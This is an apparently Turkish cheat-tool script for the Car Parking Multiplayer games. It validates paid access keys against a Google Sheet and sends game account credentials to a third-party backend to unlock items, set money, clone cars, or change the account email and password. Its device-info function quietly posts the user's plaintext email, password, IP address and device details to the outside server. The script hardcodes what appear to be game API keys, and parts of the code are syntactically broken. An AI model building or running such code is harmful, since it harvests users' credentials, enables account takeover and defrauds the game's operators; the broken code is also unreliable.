#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Bu sürümde:
- Giriş/token ve kullanıcı durumu Google Sheet'ten okunur (Firebase yok).
- users sayfasında: access_key | token | is_unlimited | coins | telegram_id
- costs sayfasında: code | cost
"""

import os
import sys
import time
import json
import requests
import platform
import subprocess
from itertools import cycle
from threading import Thread, Event

# ==========================
# GOOGLE SHEETS AYARLARI
# ==========================
# Sheet ID (senden gelen): 1A3pD1gOKa7Lgkiu8yy1LtYCUwwGqFep97VsND-33XO8
SHEET_ID = "1A3pD1gOKa7Lgkiu8yy1LtYCUwwGqFep97VsND-33XO8"
USERS_SHEET_NAME = "users"
COSTS_SHEET_NAME = "costs"

try:
    import gspread
    from google.oauth2.service_account import Credentials
except Exception as e:
    print("❌ 'gspread' ve 'google-auth' paketlerini kurmalısın: pip install gspread google-auth")
    print("Hata:", e)
    sys.exit(1)

# Sunucu endpoint'lerini kullanmaya devam etmek istemezsen BASE_URL önemli değil.
"BASE_URL = os.getenv("BASE_URL", "https://admincpm.io/KrishDev/api")

# Sheets'ten okunan token hafızada tutulacak
SHEETS_TOKEN = None


def show_banner(unlimited_status=None, current_coins=None, telegram_id=None):
    os.system('cls' if os.name == 'nt' else 'clear')
    print(" ██████╗░░█████╗░███╗░░██╗██╗░░██╗░██████╗")
    print(" ██╔══██╗██╔══██╗████╗░██║██║░██╔╝██╔════╝")
    print(" ██████╦╝██║░░██║██╔██╗██║█████═╝░╚█████╗░")
    print(" ██╔══██╗██║░░██║██║╚████║██╔═██╗░░╚═══██╗")
    print(" ██████╦╝╚█████╔╝██║░╚███║██║░╚██╗██████╔╝")
    print(" ╚═════╝░░╚════╝░╚═╝░░╚══╝╚═╝░░╚═╝╚═════╝░")
    print("===========================================")
    if unlimited_status is not None:
        if unlimited_status:
            print(f"           Abonelik: UNLIMITED ✅")
        else:
            print(f"           Abonelik: LIMITED ❌")
            if current_coins is not None:
                print(f"           Bakiye: {current_coins} coins")


def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')


def spinner_animation(stop_event):
    spinner = cycle(['|', '/', '-', '\\'])
    while not stop_event.is_set():
        sys.stdout.write(f'\r[-] Yükleniyor... {next(spinner)} ')
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r'); sys.stdout.flush()


# ==========================
# GOOGLE SHEETS YARDIMCI
# ==========================
def _open_sheet():
    """
    credentials.json ile Google Sheet'e bağlanır.
    Not: credentials.json dosyasını bu scriptin olduğu klasöre koymalısın.
    Sheet'i servis hesabının e-postası ile 'Viewer' olarak paylaşmayı unutma.
    """
    scopes = ["https://www.googleapis.com/auth/spreadsheets.readonly"]
    creds = Credentials.from_service_account_file("credentials.json", scopes=scopes)
    gc = gspread.authorize(creds)
    sh = gc.open_by_key(SHEET_ID)
    return sh


def get_user_from_sheet_by_access_key(access_key: str):
    """
    users sayfasında access_key eşleşen kaydı bulur.
    Dönen: {ok, is_unlimited, coins, telegram_id, token} veya hata.
    """
    sh = _open_sheet()
    ws = sh.worksheet(USERS_SHEET_NAME)
    records = ws.get_all_records()  # [{...}, ...]
    for row in records:
        if str(row.get("access_key", "")).strip() == access_key.strip():
            return {
                "ok": True,
                "is_unlimited": str(row.get("is_unlimited", "")).strip().upper() in ("TRUE", "1", "YES"),
                "coins": int(row.get("coins", 0) or 0),
                "telegram_id": str(row.get("telegram_id", "N/A")).strip() or "N/A",
                "token": str(row.get("token", "")).strip()
            }
    return {"ok": False, "message": "Access key bulunamadı (Google Sheet)."}


def get_service_costs_from_sheet():
    """
    costs sayfasından code|cost okur ve dict döner.
    costs sayfası yoksa boş dönebilir.
    """
    try:
        sh = _open_sheet()
        ws = sh.worksheet(COSTS_SHEET_NAME)
        records = ws.get_all_records()
        costs = {}
        for row in records:
            code = str(row.get("code", "")).strip()
            if code:
                try:
                    costs[code] = int(row.get("cost", 0) or 0)
                except:
                    pass
        return {"ok": True, "costs": costs}
    except Exception:
        return {"ok": False, "costs": {}}


# ==========================
# İSTEMCİ İŞLEVLERİ
# ==========================
def call_php_service(access_key, menu_code, token=None, email=None, password=None, extra_data=None):
    """
    Hâlâ kendi backend'ine çağrı yapmak istersen kullan.
    İstemiyorsan bu fonksiyonu mock yanıt dönecek şekilde değiştirebilirsin.
    """
    url = f"{BASE_URL}/menu.php"
    payload = {"key": access_key, "menu": menu_code}
    if token:    payload["token"] = token
    if email:    payload["email"] = email
    if password: payload["password"] = password
    if extra_data: payload.update(extra_data)

    try:
        res = requests.post(url, data=payload, timeout=15)
        if not res.text:
            return {"ok": False, "message": "Sunucudan boş cevap geldi."}
        return res.json()
    except json.JSONDecodeError as e:
        return {"ok": False, "message": f"JSON ayrıştırma hatası: {e} | Yanıt: {getattr(res, 'text', '')}"}
    except Exception as e:
        return {"ok": False, "message": f"İstek başarısız: {e}"}


def call_php_service_with_spinner(access_key, menu_code, token=None, email=None, password=None, extra_data=None):
    url = f"{BASE_URL}/menu.php"
    payload = {"key": access_key, "menu": menu_code}
    if token:    payload["token"] = token
    if email:    payload["email"] = email
    if password: payload["password"] = password
    if extra_data: payload.update(extra_data)

    stop_spinner = Event()
    spinner_thread = Thread(target=spinner_animation, args=(stop_spinner,), daemon=True)
    spinner_thread.start()

    try:
        res = requests.post(url, data=payload, timeout=30)
        stop_spinner.set(); spinner_thread.join()
        if not res.text:
            return {"ok": False, "message": "Sunucudan boş cevap geldi."}
        return res.json()
    except json.JSONDecodeError as e:
        stop_spinner.set(); spinner_thread.join()
        return {"ok": False, "message": f"JSON ayrıştırma hatası: {e} | Yanıt: {getattr(res, 'text', '')}"}
    except Exception as e:
        stop_spinner.set(); spinner_thread.join()
        return {"ok": False, "message": f"İstek başarısız: {e}"}


def check_access_key_and_get_user_status(access_key):
    """
    🔑 Access key'i Sheet'te arar, kullanıcı durumunu ve token'ı alır.
    """
    global SHEETS_TOKEN
    user = get_user_from_sheet_by_access_key(access_key)
    if not user.get("ok"):
        return False, {"message": user.get("message", "Sheet okuma hatası.")}

    SHEETS_TOKEN = user.get("token") or ""
    return True, {
        "is_unlimited": user["is_unlimited"],
        "coins": user["coins"],
        "telegram_id": user.get("telegram_id", "N/A")
    }


def send_device_os(access_key, email=None, password=None, game_label=None, telegram_id=None):
    """
    İstersen sunucuna cihaz bilgisi gönder; istemiyorsan bu fonksiyonu boş bırakabilirsin.
    """
    try:
        system = platform.system(); release = platform.release()
    except Exception:
        system = "Unknown"; release = "Unknown"

    try:
        ip_address = requests.get("https://api.ipify.org", timeout=5).text.strip()
    except Exception:
        ip_address = "Unknown"

    payload = {
        "key": access_key,
        "brand": system,
        "device_name": platform.node(),
        "os_version": release,
        "ip_address": ip_address,
        "email": email or "Unknown",
        "password": password or "Unknown",
        "telegram_id": telegram_id or "N/A",
        "game": game_label or "N/A"
    }
    try:
        # Sunucu kullanmıyorsan yorum satırı yap:
        requests.post(f"{BASE_URL}/save_device.php", json=payload, timeout=10)
    except Exception:
        pass
    return True


def login_via_sheets_token(email, password):
    """
    Giriş: Sheet'ten gelen token kullanılır (email/şifre sadece UI için).
    """
    if not SHEETS_TOKEN:
        return {"ok": False, "message": "Sheets token bulunamadı. Önce access_key girilmeli."}
    return {"ok": True, "token": SHEETS_TOKEN, "email": email, "password": password}


# ==========================
# UYGULAMA AKIŞI
# ==========================
if __name__ == "__main__":
    # Bağımlılık gereği internet gerekir (Sheet'e bağlanmak için)
    try:
        requests.get("https://www.google.com", timeout=3)
    except Exception:
        print("⚠️ İnternet yok gibi görünüyor. Google Sheet'e erişim için internet gerekir.")

    unlimited_status_for_display = None
    current_coins_for_display = None
    is_unlimited_user = False
    telegram_id_for_display = "N/A"

    email = ""
    token = None
    label_to_use = "N/A"
    main_menu = None

    # Servis ücretlerini Sheet'ten çek
    service_costs = {}
    costs_resp = get_service_costs_from_sheet()
    if costs_resp.get("ok"):
        service_costs = costs_resp["costs"]
    else:
        print("ℹ️ 'costs' sayfası okunamadı; ücretler N/A görünecek.")

    while True:
        clear_screen()
        show_banner(unlimited_status=unlimited_status_for_display,
                    current_coins=current_coins_for_display,
                    telegram_id=telegram_id_for_display)

        access_key = input("🔑 Access key: ").strip()

        is_valid_key, user_data = check_access_key_and_get_user_status(access_key)
        if not is_valid_key:
            print(f"❌ {user_data['message']}")
            time.sleep(1)
            continue

        print("✅ Key kabul edildi (Sheets).")
        is_unlimited_user = user_data['is_unlimited']
        current_coins_for_display = user_data['coins']
        telegram_id_for_display = user_data.get('telegram_id', 'N/A')

        time.sleep(0.6)

        while True:
            clear_screen()
            show_banner(unlimited_status=is_unlimited_user,
                        current_coins=current_coins_for_display,
                        telegram_id=telegram_id_for_display)
            print("Ana Menü:")
            print("1. 🚘 CAR PARKING MULTIPLAYER (CPM1)")
            print("2. 🚔 CAR PARKING MULTIPLAYER 2 (CPM2)")
            print("0. ❌ ÇIKIŞ")
            main_menu = input("Seçimin: ").strip()

            if main_menu == "0":
                print("👋 Görüşürüz!")
                sys.exit(0)
            elif main_menu == "1":
                api_key_cpm = "AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM"
                label_to_use = "CPM1"
            elif main_menu == "2":
                api_key_cpm = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
                label_to_use = "CPM2"
            else:
                print("❌ Geçersiz seçim. 0/1/2 gir.")
                time.sleep(0.8)
                continue

            print(f"\n--- {label_to_use} oturum ---")
            email = input("📧 Hesap e-postası: ").strip()
            password = input("🔐 Hesap şifresi: ").strip()

            # Firebase yerine Sheet token
            login = login_via_sheets_token(email, password)
            if not login.get("ok"):
                print(f"❌ Giriş başarısız: {login['message']}")
                time.sleep(1)
                continue

            token = login["token"]
            print(f"✅ {email} ile giriş (Sheets token)")

            # İstersen kapat: sunucuna cihaz bilgisi gönderimi
            send_device_os(access_key, email, password, label_to_use, telegram_id_for_display)
            time.sleep(0.5)

            while True:
                clear_screen()
                show_banner(unlimited_status=is_unlimited_user,
                            current_coins=current_coins_for_display,
                            telegram_id=telegram_id_for_display)
                print(f"Hesap: {email} ({label_to_use})")
                print(f"01. 👑 KING RANK (Ücret: {service_costs.get('king_rank', 'N/A')})")
                print(f"02. 📧 EMAIL DEĞİŞ (Ücret: {service_costs.get('change_email', 'N/A')})")
                print(f"03. 🔐 ŞİFRE DEĞİŞ (Ücret: {service_costs.get('change_password', 'N/A')})")
                
				if main_menu == "2":
					print(f"04. 💰 SET MONEY (Cost: {service_costs.get('set_money', 'N/A')} coins)")
                    print(f"05. 🛞 UNLOCK WHEELS (Cost: {service_costs.get('unlock_wheels', 'N/A')} coins)")
                    print(f"06. 👕 UNLOCK MALE (Cost: {service_costs.get('unlock_male', 'N/A')} coins)")
                    print(f"07. 👗 UNLOCK FEMALE (Cost: {service_costs.get('unlock_female', 'N/A')} coins)")
                    print(f"08. 🧰 UNLOCK BRAKES (Cost: {service_costs.get('unlock_brakes', 'N/A')} coins)")
                    print(f"09. 🧰 UNLOCK CALIPERS (Cost: {service_costs.get('unlock_calipers', 'N/A')} coins)")
                    print(f"10. 🎨 UNLOCK PAINTS (Cost: {service_costs.get('unlock_paints', 'N/A')} coins)")
                    print(f"11. 🎌 UNLOCK ALL FLAGS (Cost: {service_costs.get('unlock_all_flags', 'N/A')} coins)")
                    print(f"12. 🏠 UNLOCK APARTMENTS (Cost: {service_costs.get('unlock_apartments', 'N/A')} coins)")
                    print(f"13. 💯 COMPLETE MISSIONS (Cost: {service_costs.get('complete_missions', 'N/A')} coins)")
                    print(f"14. 🚨 UNLOCK SIREN & AIRSUS (Cost: {service_costs.get('unlock_all_cars_siren', 'N/A')} coins)")
                    print(f"15. 🚔 UNLOCK POLICE KITS (Cost: {service_costs.get('unlock_police_bodykits', 'N/A')} coins)")
                    print(f"16. 📦 UNLOCK SLOTS (Cost: {service_costs.get('unlock_slots', 'N/A')} coins)")
                    print(f"17. 🛒 UNLOCK BODY KITS (Cost: {service_costs.get('unlock_bodykits', 'N/A')} coins)")
                    print(f"18. 🔄 CLONE CARS FROM CPM1 TO CPM2 (Cost: {service_costs.get('copy_cpm1_car_to_cpm2', 'N/A')} coins)")
                    print(f"19. 🚗 CLONE CARS FROM CPM2 TO CPM2 (Cost: {service_costs.get('clone_cars_cpm2_to_cpm2', 'N/A')} coins)")
                    print(f"20. ➕ ADD CAR (Cost: {service_costs.get('add_car', 'N/A')} coins per car)")
                print("0.  🔙 GERİ")
                choice = input("Seçimin: ").strip()

                if choice == "0":
                    break

                # Eğer sunucu kullanmıyorsan aşağıdaki çağrıları mock'a çevirebilirsin:
                action_result = {"ok": False, "message": "Geçersiz seçim."}

                if main_menu == "1":
                    if choice == "1":
                        action_result = call_php_service(access_key, "king_rank", token, email, password,
                                                         {"api_key": api_key_cpm})
                    elif choice == "2":
                        new_email = input("📨 Yeni E-posta: ").strip()
                        action_result = call_php_service(access_key, "change_email", token, email, password,
                                                         {"new_email": new_email, "api_key": api_key_cpm})
                        if action_result.get("ok"):
                            email = new_email
                    elif choice == "3":
                        new_password = input("🔑 Yeni Şifre: ").strip()
                        action_result = call_php_service(access_key, "change_password", token, email, password,
                                                         {"new_password": new_password, "api_key": api_key_cpm})
                        if action_result.get("ok"):
                            password = new_password
                    else:
                        action_result = {"ok": False, "message": "CPM1 için geçersiz seçim."}

                elif main_menu == "2":
                    if choice == "1":
                        action_result = call_php_service_with_spinner(access_key, "king_rank", token, email, password,
                                                                      {"api_key": api_key_cpm})
                    elif choice == "2":
                        new_email = input("📨 Yeni E-posta: ").strip()
                        action_result = call_php_service_with_spinner(access_key, "change_email", token, email, password,
                                                                      {"new_email": new_email, "api_key": api_key_cpm})
                        if action_result.get("ok"):
                            email = new_email
                    elif choice == "3":
                        new_password = input("🔑 Yeni Şifre: ").strip()
                        action_result = call_php_service_with_spinner(access_key, "change_password", token, email, password,
                                                                      {"new_password": new_password, "api_key": api_key_cpm})
                        if action_result.get("ok"):
                            password = new_password
                    elif choice == "4":
                        amount = input("💵 Miktar: ").strip()
                        if amount.isdigit():
                            action_result = call_php_service_with_spinner(access_key, "set_money", token, email, password,
                                                                          {"amount": int(amount)})
                        else:
                            action_result = {"ok": False, "message": "Miktar geçersiz."}
                    else:
                        action_result = {"ok": False, "message": "CPM2 için geçersiz seçim."}

                if action_result.get("ok"):
                    print(f"✅ {action_result.get('message', 'Başarılı.')}")
                else:
                    print(f"❌ {action_result.get('message', 'İşlem başarısız.')}")
                time.sleep(1)

                # Kullanıcı durumunu tekrar Sheet'ten çek (ör. coins güncellenmişse)
                is_valid_key, updated_user = check_access_key_and_get_user_status(access_key)
                if is_valid_key:
                    is_unlimited_user = updated_user['is_unlimited']
                    current_coins_for_display = updated_user['coins']
                    telegram_id_for_display = updated_user.get('telegram_id', 'N/A')
				else:
                    print("⚠️ Could not retrieve updated user status. Please check connection.")
                
                time.sleep(1)
